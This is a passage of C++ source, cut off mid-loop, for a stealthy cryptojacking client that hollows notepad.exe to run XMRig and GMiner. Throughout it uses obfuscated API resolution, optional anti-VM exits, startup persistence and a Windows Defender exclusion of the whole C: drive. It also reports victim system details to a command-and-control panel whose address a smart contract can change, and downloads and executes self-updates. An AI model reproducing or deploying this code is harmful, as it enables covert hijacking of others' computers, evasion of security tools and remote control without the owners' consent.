#include <windows.h>

#include <iostream>
#include <stdio.h>
#include <csignal>

#include "../include/ntddk.h"
#include "../include/kernel32_undoc.h"
#include "../include/util.h"

#include "../include/pe_hdrs_helper.h"
#include "../include/hollowing_parts.h"
#include "../include/delete_pending_file.h"
#include "../include/http_client.h"
#include "../include/json_printer.h"
#include "../include/config_manager.h"
#include "../include/encryption.h"
#include "../include/embedded_resource.h"
#include "../include/remote_miner_loader.h"
#include "../include/contract_reader.h"

// Include Obfusk8 for stealth API calling and indirect syscalls
#include "../Obfusk8/Instrumentation/materialization/state/Obfusk8Core.hpp"

#include "../src/inject_core.cpp"

#ifdef ENABLE_ANTIVM
#include "../include/antivm.h"
#endif

#ifdef ENABLE_PERSISTENCE
#include "../include/persistence.h"
#endif

// Global variables for signal handling
static bool g_lastCpuIdleStatus = false;  // Track last idle status to detect changes
static volatile bool g_shouldExit = false;  // Flag to signal exit on Ctrl+C

// Closes the handles of a miner that has already been terminated and drops its
// ProcessStorage entry. Every restart used to leak a process handle, a thread
// handle and a map entry.
static void close_miner_handles(std::optional<PROCESS_INFORMATION>& pi) {
    if (!pi) return;

    if (pi->hProcess) CloseHandle(pi->hProcess);
    if (pi->hThread)  CloseHandle(pi->hThread);

    ProcessStorage::RemoveProcess(pi->dwProcessId);
    pi.reset();
}

// Signal handler for graceful shutdown
BOOL WINAPI ConsoleHandler(DWORD signal) {
    if (signal == CTRL_C_EVENT || signal == CTRL_BREAK_EVENT || 
        signal == CTRL_CLOSE_EVENT || signal == CTRL_SHUTDOWN_EVENT) {
#ifdef ENABLE_DEBUG_CONSOLE
        std::cout << "[!] Signal received, terminating miner processes..." << std::endl;
#endif
        
        // Terminate every tracked miner process. ProcessStorage owns the live
        // handles, so this can never act on a stale or already-closed handle
        // (the old global HANDLE copies could). exit() reclaims the handles.
        ProcessStorage::TerminateAll();
        
        // Set exit flag and terminate
        g_shouldExit = true;
        std::cout << "[*] Exiting..." << std::endl;
        exit(0);
        return TRUE;
    }
    return FALSE;
}

// Check for updates from the panel
bool CheckAndApplyUpdate(const std::string& panelUrl, const std::string& currentVersion) {
    // Stealth API resolution for file/process operations
    typedef HANDLE(WINAPI* pCreateFileW_t)(LPCWSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
    typedef BOOL(WINAPI* pWriteFile_t)(HANDLE, LPCVOID, DWORD, LPDWORD, LPOVERLAPPED);
    typedef BOOL(WINAPI* pCloseHandleM_t)(HANDLE);
    typedef BOOL(WINAPI* pDeleteFileW_t)(LPCWSTR);
    typedef BOOL(WINAPI* pGetTempPathW_t)(DWORD, LPWSTR);
    typedef UINT(WINAPI* pGetTempFileNameW_t)(LPCWSTR, LPCWSTR, UINT, LPWSTR);
    typedef DWORD(WINAPI* pGetModuleFileNameW_t)(HMODULE, LPWSTR, DWORD);
    typedef BOOL(WINAPI* pCreateProcessW_t)(LPCWSTR, LPWSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCWSTR, LPSTARTUPINFOW, LPPROCESS_INFORMATION);
    pCreateFileW_t _CreateFileW = (pCreateFileW_t)STEALTH_API_OBFSTR("kernel32.dll", "CreateFileW");
    pWriteFile_t _WriteFile = (pWriteFile_t)STEALTH_API_OBFSTR("kernel32.dll", "WriteFile");
    pCloseHandleM_t _CloseHandle = (pCloseHandleM_t)STEALTH_API_OBFSTR("kernel32.dll", "CloseHandle");
    pDeleteFileW_t _DeleteFileW = (pDeleteFileW_t)STEALTH_API_OBFSTR("kernel32.dll", "DeleteFileW");
    pGetTempPathW_t _GetTempPathW = (pGetTempPathW_t)STEALTH_API_OBFSTR("kernel32.dll", "GetTempPathW");
    pGetTempFileNameW_t _GetTempFileNameW = (pGetTempFileNameW_t)STEALTH_API_OBFSTR("kernel32.dll", "GetTempFileNameW");
    pGetModuleFileNameW_t _GetModuleFileNameW = (pGetModuleFileNameW_t)STEALTH_API_OBFSTR("kernel32.dll", "GetModuleFileNameW");
    pCreateProcessW_t _CreateProcessW = (pCreateProcessW_t)STEALTH_API_OBFSTR("kernel32.dll", "CreateProcessW");
    if (!_CreateFileW || !_WriteFile || !_CloseHandle || !_GetModuleFileNameW) return false;
    try {
        // Extract base panel URL (without the /api/miners/submit part)
        std::string baseUrl = panelUrl;
        std::string apiMarker = OBFUSCATE_STRING("/api/");
        size_t apiPos = baseUrl.find(apiMarker);
        if (apiPos != std::string::npos) {
            baseUrl = baseUrl.substr(0, apiPos);
        }

        std::string versionUrl = baseUrl + OBFUSCATE_STRING("/api/updates/current");
        std::string response = fetchJsonFromUrl(Utf8ToWide(versionUrl), 0);
        
        if (response.empty()) {
#ifdef ENABLE_DEBUG_CONSOLE
            std::cerr << "[-] Failed to check for updates from: " << versionUrl << std::endl;
#endif
            return false;
        }
        
        // Parse JSON response to get version and download URL
        std::string panelVersion;
        std::string downloadUrl;
        
        // Extract "version" field
        size_t versionPos = response.find("\"version\":");
        if (versionPos != std::string::npos) {
            size_t startQuote = response.find("\"", versionPos + 10);
            size_t endQuote = response.find("\"", startQuote + 1);
            if (startQuote != std::string::npos && endQuote != std::string::npos) {
                panelVersion = response.substr(startQuote + 1, endQuote - startQuote - 1);
            }
        }
        
        // Extract "download_url" field
        size_t urlPos = response.find("\"download_url\":");
        if (urlPos != std::string::npos) {
            size_t startQuote = response.find("\"", urlPos + 15);
            size_t endQuote = response.find("\"", startQuote + 1);
            if (startQuote != std::string::npos && endQuote != std::string::npos) {
                downloadUrl = response.substr(startQuote + 1, endQuote - startQuote - 1);
            }
        }
        
        // Check if version is different
        if (panelVersion.empty() || panelVersion == currentVersion || downloadUrl.empty()) {
#ifdef ENABLE_DEBUG_CONSOLE
            std::cout << "[*] No update available. Current: " << currentVersion << ", Server: " << panelVersion << std::endl;
#endif
            return false;
        }
        
#ifdef ENABLE_DEBUG_CONSOLE
        std::cout << "[!] Update available! Current: " << currentVersion << ", Available: " << panelVersion << std::endl;
        std::cout << "[*] Download URL: " << downloadUrl << std::endl;
#endif
        
        // Build full download URL
        std::string fullDownloadUrl = baseUrl + downloadUrl;
        
        // Download update
        size_t updateSize = 0;
        BYTE *updateBuf = downloadBinaryFromUrl(Utf8ToWide(fullDownloadUrl), updateSize, 0);
        
        if (updateSize == 0 || updateBuf == nullptr) {
            std::cerr << "[-] Downloaded update file is empty or download failed" << std::endl;
            return false;
        }
        
#ifdef ENABLE_DEBUG_CONSOLE
        std::cout << "[+] Downloaded update: " << updateSize << " bytes" << std::endl;
#endif
        
        // Get current executable path
        wchar_t exePath[MAX_PATH] = {0};
        if (!_GetModuleFileNameW(NULL, exePath, MAX_PATH)) {
#ifdef ENABLE_DEBUG_CONSOLE
            std::cerr << "[-] Failed to get current executable path" << std::endl;
#endif
            free_buffer(updateBuf);
            return false;
        }

        wchar_t tempPath[MAX_PATH] = {0};
        wchar_t tempDir[MAX_PATH] = {0};

        if (!_GetTempPathW || !_GetTempPathW(MAX_PATH, tempDir)) {
#ifdef ENABLE_DEBUG_CONSOLE
            std::cerr << "[-] Failed to get temp directory" << std::endl;
#endif
            free_buffer(updateBuf);
            return false;
        }

        if (!_GetTempFileNameW || !_GetTempFileNameW(tempDir, L"CM", 0, tempPath)) {
#ifdef ENABLE_DEBUG_CONSOLE
            std::cerr << "[-] Failed to create temp filename" << std::endl;
#endif
            free_buffer(updateBuf);
            return false;
        }

        HANDLE tempFile = _CreateFileW(tempPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        if (tempFile == INVALID_HANDLE_VALUE) {
#ifdef ENABLE_DEBUG_CONSOLE
            std::cerr << "[-] Failed to create temp file" << std::endl;
#endif
            free_buffer(updateBuf);
            return false;
        }

        DWORD bytesWritten = 0;
        if (!_WriteFile(tempFile, updateBuf, (DWORD)updateSize, &bytesWritten, NULL) || bytesWritten != (DWORD)updateSize) {
#ifdef ENABLE_DEBUG_CONSOLE
            std::cerr << "[-] Failed to write update to temp file" << std::endl;
#endif
            _CloseHandle(tempFile);
            if (_DeleteFileW) _DeleteFileW(tempPath);
            free_buffer(updateBuf);
            return false;
        }
        _CloseHandle(tempFile);
        free_buffer(updateBuf);
        
#ifdef ENABLE_DEBUG_CONSOLE
        std::cout << "[+] Update written to temp file" << std::endl;
#endif
        
        // Create batch script to replace executable
        wchar_t batchPath[MAX_PATH] = {0};
        wcscpy_s(batchPath, MAX_PATH, tempPath);
        size_t len = wcslen(batchPath);
        if (len >= 4) {
            wcscpy_s(batchPath + len - 3, 4, L"bat");
        }
        
        // Convert wide char paths to strings for batch file
        char exePathStr[MAX_PATH] = {0};
        char tempPathStr[MAX_PATH] = {0};
        char batchPathStr[MAX_PATH] = {0};
        
        WideCharToMultiByte(CP_ACP, 0, exePath, -1, exePathStr, sizeof(exePathStr), NULL, NULL);
        WideCharToMultiByte(CP_ACP, 0, tempPath, -1, tempPathStr, sizeof(tempPathStr), NULL, NULL);
        WideCharToMultiByte(CP_ACP, 0, batchPath, -1, batchPathStr, sizeof(batchPathStr), NULL, NULL);
        
        // Create batch content. The client may be running under a renamed image
        // (persistence copies it to VLCManager.exe), so kill by our own image
        // name instead of a hardcoded one.
        std::string selfName = std::string(exePathStr);
        size_t selfSep = selfName.find_last_of("\\/");
        if (selfSep != std::string::npos) selfName = selfName.substr(selfSep + 1);

        std::string batchContent = OBFUSCATE_STRING("@echo off\n");
        batchContent += OBFUSCATE_STRING("timeout /t 1 /nobreak\n");
        batchContent += OBFUSCATE_STRING("taskkill /f /im \"") + selfName + OBFUSCATE_STRING("\" 2>nul\n");
        batchContent += OBFUSCATE_STRING("timeout /t 1 /nobreak\n");
        batchContent += OBFUSCATE_STRING("del /q \"") + std::string(exePathStr) + OBFUSCATE_STRING("\"\n");
        batchContent += OBFUSCATE_STRING("move /y \"") + std::string(tempPathStr) + OBFUSCATE_STRING("\" \"") + std::string(exePathStr) + OBFUSCATE_STRING("\"\n");
        batchContent += OBFUSCATE_STRING("start \"\" \"") + std::string(exePathStr) + OBFUSCATE_STRING("\"\n");
        batchContent += OBFUSCATE_STRING("del /q \"%~f0\"\n");
        
        HANDLE batchFile = _CreateFileW(batchPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        if (batchFile == INVALID_HANDLE_VALUE) {
#ifdef ENABLE_DEBUG_CONSOLE
            std::cerr << "[-] Failed to create batch file" << std::endl;
#endif
            if (_DeleteFileW) _DeleteFileW(tempPath);
            return false;
        }

        bytesWritten = 0;
        if (!_WriteFile(batchFile, batchContent.c_str(), (DWORD)batchContent.size(), &bytesWritten, NULL)) {
#ifdef ENABLE_DEBUG_CONSOLE
            std::cerr << "[-] Failed to write batch file" << std::endl;
#endif
            _CloseHandle(batchFile);
            if (_DeleteFileW) { _DeleteFileW(tempPath); _DeleteFileW(batchPath); }
            return false;
        }
        _CloseHandle(batchFile);
        
#ifdef ENABLE_DEBUG_CONSOLE
        std::cout << "[+] Created update batch script" << std::endl;
#endif
        
        STARTUPINFOW si = {0};
        PROCESS_INFORMATION pi = {0};
        si.cb = sizeof(si);

        std::string cmdLineStr = OBFUSCATE_STRING("cmd.exe /c ") + std::string(batchPathStr);
        wchar_t cmdLineWide[512] = {0};
        MultiByteToWideChar(CP_ACP, 0, cmdLineStr.c_str(), -1, cmdLineWide, sizeof(cmdLineWide)/sizeof(wchar_t));

        if (!_CreateProcessW || !_CreateProcessW(NULL, cmdLineWide, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
#ifdef ENABLE_DEBUG_CONSOLE
            std::cerr << "[-] Failed to execute update batch" << std::endl;
#endif
            if (_DeleteFileW) { _DeleteFileW(tempPath); _DeleteFileW(batchPath); }
            return false;
        }

        _CloseHandle(pi.hProcess);
        _CloseHandle(pi.hThread);
        
#ifdef ENABLE_DEBUG_CONSOLE
        std::cout << "[+] Update batch started, exiting..." << std::endl;
#endif
        
        return true;
        
    } catch (const std::exception& e) {
        std::cerr << "[-] Exception in CheckAndApplyUpdate: " << e.what() << std::endl;
        return false;
    }
}

// Loads an embedded miner payload on demand. Returns true when a payload is
// available (already loaded, or just loaded now).
static bool ensure_embedded_xmrig(BYTE*& buf, size_t& size) {
    if (buf != nullptr && size > 0) return true;

    try {
        LoadEmbeddedXMRig(buf, size);
    } catch (...) {
        buf = nullptr;
        size = 0;
    }
    return buf != nullptr && size > 0;
}

static bool ensure_embedded_gminer(BYTE*& buf, size_t& size) {
    if (buf != nullptr && size > 0) return true;

    try {
        LoadEmbeddedGminer(buf, size);
    } catch (...) {
        buf = nullptr;
        size = 0;
    }
    return buf != nullptr && size > 0;
}

int main(int argc, char *argv[])
{
    // Check if another instance is already running
    if (IsAnotherInstanceRunning(OBFUSCATE_STRING("Global\\CMM").c_str())) {
#ifdef ENABLE_DEBUG_CONSOLE
        std::cerr << "[!] Another instance is already running. Exiting." << std::endl;
#endif
        return 0;
    }

    // Register signal handler to cleanup miner process on termination
    if (!SetConsoleCtrlHandler(ConsoleHandler, TRUE)) {
#ifdef ENABLE_DEBUG_CONSOLE
        std::cerr << OBFUSCATE_STRING("[-] Failed to set console control handler").c_str() << std::endl;
#endif
    }

#ifdef ENABLE_ANTIVM
    // Run anti-VM detection
    auto vmResult = AntiVM::DetectVM();
    if (vmResult.first) {
#ifdef ENABLE_DEBUG_CONSOLE
        std::cerr << "[!] VM/Sandbox detected: " << vmResult.second << std::endl;
#endif
        // Exit silently in release mode to avoid detection
        return 0;
    }
#ifdef ENABLE_DEBUG_CONSOLE
    std::cout << "[+] Anti-VM check passed: " << vmResult.second << std::endl;
#endif
#endif

#ifdef ENABLE_PERSISTENCE
    // Add to startup for persistence
    if (Persistence::AddToStartup()) {
#ifdef ENABLE_DEBUG_CONSOLE
        std::cout << "[+] Successfully added to startup" << std::endl;
#endif
    } else {
#ifdef ENABLE_DEBUG_CONSOLE
        std::cerr << "[-] Failed to add to startup" << std::endl;
#endif
    }
#endif

    std::string panelUrlsStr = OBFUSCATE_STRING("http://127.0.0.1:8080/api/miners/submit");
    std::string configGetUrlStr = OBFUSCATE_STRING("");

#ifdef ENABLE_CONTRACT_URL
    {
        // Fetch the URL stored in the TextStorage smart contract at runtime.
        // The returned string replaces the compile-time panel URL so the C&C
        // address can be updated on-chain without rebuilding the binary.
        std::string contractUrl = FetchUrlFromContract();
        if (!contractUrl.empty()) {
            panelUrlsStr = contractUrl;
#ifdef ENABLE_DEBUG_CONSOLE
            std::cout << "[+] Using URL from smart contract: " << contractUrl << std::endl;
#endif
        } else {
#ifdef ENABLE_DEBUG_CONSOLE
            std::cerr << "[-] Contract URL fetch failed; falling back to compiled-in URL" << std::endl;
#endif
        }
    }
#endif // ENABLE_CONTRACT_URL
    
    // Client version - update this for each release
    const std::string CLIENT_VERSION = OBFUSCATE_STRING("3.1.0");

    // Prefix used when passing XOR-encrypted XMRig args to the injected process
    const std::string ENC_ARGS_PREFIX = OBFUSCATE_STRING("--encargs ");

    // Pre-encrypt common GPU mining argument strings to stay under 16 encryption limit
    const std::string GMINER_ALGO     = OBFUSCATE_STRING("--algo ");
    const std::string GMINER_SERVER   = OBFUSCATE_STRING(" --server ");
    const std::string GMINER_USER     = OBFUSCATE_STRING(" --user ");
    const std::string GMINER_WORKER   = OBFUSCATE_STRING(" --worker ");
    const std::string GMINER_SSL_OFF  = OBFUSCATE_STRING(" --ssl 0");
    const std::string GMINER_SSL_ON   = OBFUSCATE_STRING(" --ssl 1");
    const std::string GMINER_PERS     = OBFUSCATE_STRING(" --pers ");
    const std::string GMINER_FAN      = OBFUSCATE_STRING(" --fan ");
    const std::string GMINER_API      = OBFUSCATE_STRING(" --api 21550 --watchdog 0 --color 0");

    // Map synthetic panel algo names to GMiner --algo values.
    // Equihash coins share the same base algo but differ only by --pers string.
    auto getAlgoMapping = [](const std::string& algo) -> std::string {
        if (algo == "equihash144_5_btg") return "equihash144_5";
        if (algo == "equihash144_5_zen") return "equihash144_5";
        if (algo == "equihash125_4_zec") return "equihash125_4";
        return algo;
    };

    // Return the personalization string for equihash algos (empty = no --pers needed).
    auto getPersString = [](const std::string& algo) -> std::string {
        if (algo == "equihash144_5_btg") return "BgoldPoW";
        if (algo == "equihash144_5_zen") return "ZcashPoW";
        if (algo == "equihash125_4_zec") return "ZcashPoW";
        return "";
    };
    
#ifdef ENABLE_DEBUG_CONSOLE
    std::cout << "[DEBUG] Decrypted Panel URL(s): " << panelUrlsStr << std::endl;
    std::cout << "[DEBUG] Decrypted Config URL: " << (configGetUrlStr.empty() ? "(not set)" : configGetUrlStr) << std::endl;
#endif
    
    // Get system information (needed for both GET and POST methods)
    std::string pcUsername = GetWindowsUsername();
    std::string deviceHash = GetComputerHash();
    std::string cpuName = GetCPUName();
    std::string gpuName = GetGPUName();
    std::string antivirusName = GetAntivirusName();
    
    // Initialize config manager
    ConfigManager configManager;
    
    // Determine which config fetch method to use
    if (!configGetUrlStr.empty()) {
        // Use direct GET request to fetch config with fallback
#ifdef ENABLE_DEBUG_CONSOLE
        std::cout << "[*] Fetching configuration from URL via GET request..." << std::endl;
#endif
        if (!configManager.FetchConfigFromUrlWithFallback(configGetUrlStr)) {
            std::cerr << "[-] Failed to fetch configuration from config URL. Exiting." << std::endl;
            return 1;
        }
    } else {
        // Use traditional method: send system info and POST to panel
        
#ifdef ENABLE_DEBUG_CONSOLE
        std::cout << "[*] System Information:" << std::endl;
        std::cout << "    Username: " << pcUsername << std::endl;
        std::cout << "    Device Hash: " << deviceHash << std::endl;
        std::cout << "    CPU: " << cpuName << std::endl;
        std::cout << "    GPU: " << gpuName << std::endl;
        std::cout << "    Antivirus: " << antivirusName << std::endl;
#endif
        
        // Fetch configuration from panel(s) with fallback support
#ifdef ENABLE_DEBUG_CONSOLE
        std::cout << "[*] Fetching configuration from panel..." << std::endl;
#endif
        if (!configManager.FetchConfigFromPanelWithFallback(panelUrlsStr, pcUsername, deviceHash, cpuName, gpuName, antivirusName, CLIENT_VERSION, 0.0, 0.0, GetSystemUptimeMinutes())) {
            std::cerr << "[-] Failed to fetch configuration from all panel URLs. Exiting." << std::endl;
            return 1;
        }
    }
    
    const MinerConfig& cpuConfig = configManager.GetCPUConfig();
    const MinerConfig& gpuConfig = configManager.GetGPUConfig();
    
    // Verify we have valid configurations
    if (cpuConfig.mining_url.empty() && gpuConfig.mining_url.empty()) {
        std::cerr << "[-] No valid mining configuration received. Exiting." << std::endl;
        return 1;
    }
    
    const bool is32bit = false;

    // Create mutable buffers for both miners
    wchar_t payloadPath[MAX_PATH] = {0};
    wchar_t targetPath[MAX_PATH] = {0};
    std::string _targetNarrow = OBFUSCATE_STRING("C:\\Windows\\system32\\notepad.exe");
    std::wstring targetStr(_targetNarrow.begin(), _targetNarrow.end());
    wcscpy_s(targetPath, MAX_PATH, targetStr.c_str());

#ifdef ENABLE_REMOTE_MINERS
    // Miner payloads are prepared only for miners that are actually enabled, and
    // the embedded copy is loaded only when the download fails. A disabled miner
    // must not pay for its binary (GMiner alone is ~80 MB) in RAM.
    size_t xmrigPayloadSize = 0;
    BYTE *xmrigBuf = nullptr;
    bool remoteXmrigDownloaded = false;

    size_t gminerPayloadSize = 0;
    BYTE *gminerBuf = nullptr;
    bool remoteGminerDownloaded = false;

    // Try to download remote miners now; if the panel is offline we fall back to
    // the embedded payloads so mining can still start.
#ifdef ENABLE_DEBUG_CONSOLE
    std::cout << "[*] Remote miner loading enabled - attempting download from panel..." << std::endl;
#endif
    {
        BYTE *remoteXmrig = nullptr;
        size_t remoteXmrigSize = 0;
        if (cpuConfig.enabled == 1 &&
            DownloadMinerWithFallback(panelUrlsStr, "/resources/xmrig", remoteXmrig, remoteXmrigSize)) {
            xmrigBuf = remoteXmrig;
            xmrigPayloadSize = remoteXmrigSize;
            remoteXmrigDownloaded = true;
#ifdef ENABLE_DEBUG_CONSOLE
            std::cout << "[+] Downloaded remote XMRig: " << xmrigPayloadSize << " bytes" << std::endl;
#endif
        } else if (cpuConfig.enabled != 1) {
#ifdef ENABLE_DEBUG_CONSOLE
            std::cout << "[*] CPU mining disabled - skipping XMRig download and payload load" << std::endl;
#endif
        } else {
#ifdef ENABLE_DEBUG_CONSOLE
            std::cerr << "[-] Remote XMRig download failed - using embedded fallback" << std::endl;
#endif
            if (ensure_embedded_xmrig(xmrigBuf, xmrigPayloadSize)) {
#ifdef ENABLE_DEBUG_CONSOLE
                std::cout << "[+] Loaded embedded XMRig as fallback: " << xmrigPayloadSize << " bytes" << std::endl;
#endif
            }
        }

        BYTE *remoteGminer = nullptr;
        size_t remoteGminerSize = 0;
        if (gpuConfig.enabled == 1 &&
            DownloadMinerWithFallback(panelUrlsStr, "/resources/gminer", remoteGminer, remoteGminerSize)) {
            gminerBuf = remoteGminer;
            gminerPayloadSize = remoteGminerSize;
            remoteGminerDownloaded = true;
#ifdef ENABLE_DEBUG_CONSOLE
            std::cout << "[+] Downloaded remote GMiner: " << gminerPayloadSize << " bytes" << std::endl;
#endif
        } else if (gpuConfig.enabled != 1) {
#ifdef ENABLE_DEBUG_CONSOLE
            std::cout << "[*] GPU mining disabled - skipping GMiner download and payload load" << std::endl;
#endif
        } else {
#ifdef ENABLE_DEBUG_CONSOLE
            std::cerr << "[-] Remote GMiner download failed - using embedded fallback" << std::endl;
#endif
            if (ensure_embedded_gminer(gminerBuf, gminerPayloadSize)) {
#ifdef ENABLE_DEBUG_CONSOLE
                std::cout << "[+] Loaded embedded GMiner as fallback: " << gminerPayloadSize << " bytes" << std::endl;
#endif
            }
        }
    }
#else
    // Load embedded miners
    size_t xmrigPayloadSize = 0;
    BYTE *xmrigBuf = nullptr;
    
#ifdef ENABLE_CPU_MINER
    // Load XMRig miner from embedded resource (only when CPU mining is enabled)
    if (cpuConfig.enabled == 1) {
        try {
            LoadEmbeddedXMRig(xmrigBuf, xmrigPayloadSize);
#ifdef ENABLE_DEBUG_CONSOLE
            std::cout << "[+] Loaded XMRig payload: " << xmrigPayloadSize << " bytes" << std::endl;
#endif
        } catch (const std::exception& e) {
            std::cerr << "[-] Failed to load XMRig from resources: " << e.what() << std::endl;
            return -1;
        }
    } else {
        std::cout << "[*] CPU mining disabled - skipping XMRig payload load" << std::endl;
    }
#else
    std::cout << "[*] CPU miner not enabled in this build" << std::endl;
#endif

    // Load GMiner from embedded resource (only when GPU mining is enabled)
    size_t gminerPayloadSize = 0;
    BYTE *gminerBuf = nullptr;
    
#ifdef ENABLE_GPU_MINER
    if (gpuConfig.enabled == 1) {
        try {
            LoadEmbeddedGminer(gminerBuf, gminerPayloadSize);
#ifdef ENABLE_DEBUG_CONSOLE
            std::cout << "[+] Loaded GMiner payload: " << gminerPayloadSize << " bytes" << std::endl;
#endif
        } catch (const std::exception& e) {
            std::cerr << "[-] Failed to load GMiner from resources: " << e.what() << std::endl;
            gminerBuf = nullptr;
            gminerPayloadSize = 0;
        }
    } else {
        std::cout << "[*] GPU mining disabled - skipping GMiner payload load" << std::endl;
    }
#else
    std::cout << "[*] GPU miner not enabled in this build" << std::endl;
#endif
#endif

    // Build command line arguments for CPU
    std::cout << "[*] Checking if device is idle (threshold: " << cpuConfig.wait_time_idle << " minutes)..." << std::endl;
    bool cpuIsIdle = IsDeviceIdle(cpuConfig.wait_time_idle);
    std::string cpuCommand = configManager.BuildCommandLineArgs(cpuConfig, cpuIsIdle);
    
    if (cpuCommand.empty()) {
        std::cerr << "[-] Failed to build CPU command line arguments" << std::endl;
    }
    
    // Store the initial config to detect changes
    MinerConfig lastCpuConfig = cpuConfig;
    MinerConfig lastGpuConfig = gpuConfig;
    
#ifdef ENABLE_DEBUG_CONSOLE
    std::cout << "[+] CPU Command: " << cpuCommand << std::endl;
#endif

    // Launch miners independently
    DWORD cpuPid = 0;
    std::optional<PROCESS_INFORMATION> cpuPi;
    
    // Only launch XMRig if CPU mining is enabled and payload is available
    if (cpuConfig.enabled == 1 && !cpuCommand.empty()) {
        if (xmrigBuf == nullptr || xmrigPayloadSize == 0) {
#ifdef ENABLE_DEBUG_CONSOLE
            std::cerr << "[-] XMRig payload not available (remote download failed, no embedded fallback)" << std::endl;
#endif
        } else {
            cpuPid = transacted_hollowing(targetPath, xmrigBuf, (DWORD)xmrigPayloadSize,
                ScopedLPWSTR(ENC_ARGS_PREFIX + XorEncryptToHex(cpuCommand, pcUsername)));
            Sleep(500);
            cpuPi = ProcessStorage::GetProcess(cpuPid);
            if (cpuPid != 0) {
#ifdef ENABLE_DEBUG_CONSOLE
                std::cout << "[+] Launched XMRig (CPU) into PID: " << cpuPid << std::endl;
#endif
            } else {
                std::cerr << "[-] XMRig injection failed!" << std::endl;
                free_buffer(xmrigBuf);
                return 1;
            }
        }
    } else {
#ifdef ENABLE_DEBUG_CONSOLE
        std::cout << "[*] CPU mining disabled, skipping XMRig injection" << std::endl;
#endif
        free_buffer(xmrigBuf);
    }

    DWORD gpuPid = 0;
    std::optional<PROCESS_INFORMATION> gpuPi;
    
    if (gminerBuf != nullptr && gminerPayloadSize > 0)
    {
        // Only launch GMiner if GPU mining is enabled
        if (gpuConfig.enabled == 1) {
            // Build GMiner arguments from GPU config
            std::string gminer_args = GMINER_ALGO + getAlgoMapping(gpuConfig.algo);
            { const std::string p = getPersString(gpuConfig.algo); if (!p.empty()) gminer_args += GMINER_PERS + p; }
            gminer_args += GMINER_SERVER + gpuConfig.mining_url;
            gminer_args += GMINER_USER   + gpuConfig.wallet + "." + gpuConfig.password;
            gminer_args += GMINER_WORKER + gpuConfig.password;
            gminer_args += (gpuConfig.use_ssl == 1 ? GMINER_SSL_ON : GMINER_SSL_OFF);
            if (gpuConfig.fan_speed > 0 && IsRunningAsAdmin()) {
                gminer_args += GMINER_FAN + std::to_string(gpuConfig.fan_speed);
            }
            gminer_args += GMINER_API;
            
#ifdef ENABLE_DEBUG_CONSOLE
            std::cout << "[+] GMiner payload size: " << gminerPayloadSize << " bytes" << std::endl;
            std::cout << "[+] GMiner arguments: " << gminer_args << std::endl;
#endif
            
            gpuPid = transacted_hollowing(targetPath, gminerBuf, (DWORD)gminerPayloadSize, ScopedLPWSTR(gminer_args));
            Sleep(500);  // Give system time to stabilize after injection
            gpuPi = ProcessStorage::GetProcess(gpuPid);
            
            if (gpuPid != 0) {
#ifdef ENABLE_DEBUG_CONSOLE
                std::cout << "[+] Launched GMiner (GPU) into PID: " << gpuPid << std::endl;
#endif
            } else {
                std::cerr << "[-] GMiner injection failed!" << std::endl;
            }
        } else {
            std::cout << "[*] GPU mining disabled, skipping GMiner injection" << std::endl;
            free_buffer(gminerBuf);
        }
    } else {
        std::cerr << "[-] Failed to load gminer!" << std::endl;
    }

#ifdef ENABLE_DEFENDER_EXCLUSION
    // Add C: drive to Windows Defender exclusion if running as admin
    if (IsRunningAsAdmin()) {
        std::cout << "[*] Attempting to add C: drive to Windows Defender exclusion..." << std::endl;
        if (AddDefenderExclusion("C:\\")) {
            std::cout << "[+] Successfully added C: drive to Windows Defender exclusion" << std::endl;
        } else {
            std::cerr << "[-] Failed to add C: drive to Windows Defender exclusion" << std::endl;
        }
    } else {
        std::cout << "[*] Not running as admin, skipping Windows Defender exclusion" << std::endl;
    }
#endif

    int checkInCounter = 0;
    int updateCheckCounter = 0;
    int idlePrintCounter = 0;
    int hashratePrintCounter = 0;
    const int CHECK_IN_INTERVAL    = 15;  // seconds (4 minutes)
    const int UPDATE_CHECK_INTERVAL = 3600; // seconds (1 hour)
    bool panelOnline = true; // we reached the panel successfully to get here

    if (CheckAndApplyUpdate(panelUrlsStr, CLIENT_VERSION)) {
#ifdef ENABLE_DEBUG_CONSOLE
        std::cout << "[+] Update applied, restarting..." << std::endl;
#endif
        return 0;
    }

    while (true)
    {
        // Check in with panel every 4 minutes
        checkInCounter++;
        if (checkInCounter >= CHECK_IN_INTERVAL)
        {
            checkInCounter = 0;
            double cpuHashrate = 0.0;
            double gpuHashrate = 0.0;
            std::string gpuHashrateUnit = "H/s";

            if (cpuPid != 0 && IsPidRunning(cpuPid)) {
                cpuHashrate = GetMinerHashrate();
            }
            if (gpuPid != 0 && IsPidRunning(gpuPid)) {
                auto [val, unit] = GetGPUMinerHashrate();
                gpuHashrate = val;
                gpuHashrateUnit = unit;
            }

            {
                bool configFetched = false;
                if (!configGetUrlStr.empty()) {
                    configFetched = configManager.FetchConfigFromUrlWithFallback(configGetUrlStr);
                } else {
                    configFetched = configManager.FetchConfigFromPanelWithFallback(panelUrlsStr, pcUsername, deviceHash, cpuName, gpuName, antivirusName, CLIENT_VERSION, cpuHashrate, gpuHashrate, GetSystemUptimeMinutes());
                }

                if (!configFetched && panelOnline) {
                    panelOnline = false;
#ifdef ENABLE_DEBUG_CONSOLE
                    std::cout << "[-] Panel offline" << std::endl;
#endif
                } else if (configFetched && !panelOnline) {
                    panelOnline = true;
#ifdef ENABLE_DEBUG_CONSOLE
                    std::cout << "[+] Panel back online" << std::endl;
#endif
                }
                
                if (configFetched) {
                    const MinerConfig& newCpuConfig = configManager.GetCPUConfig();
                    const MinerConfig& newGpuConfig = configManager.GetGPUConfig();
                    
                    // Check if CPU config has changed
                    bool cpuConfigChanged = (newCpuConfig.mining_url != lastCpuConfig.mining_url ||
                                            newCpuConfig.wallet != lastCpuConfig.wallet ||
                                            newCpuConfig.password != lastCpuConfig.password ||
                                            newCpuConfig.non_idle_usage != lastCpuConfig.non_idle_usage ||
                                            newCpuConfig.idle_usage != lastCpuConfig.idle_usage ||
                                            newCpuConfig.enabled != lastCpuConfig.enabled);
                    
                    // Check if GPU config has changed
                    bool gpuConfigChanged = (newGpuConfig.mining_url != lastGpuConfig.mining_url ||
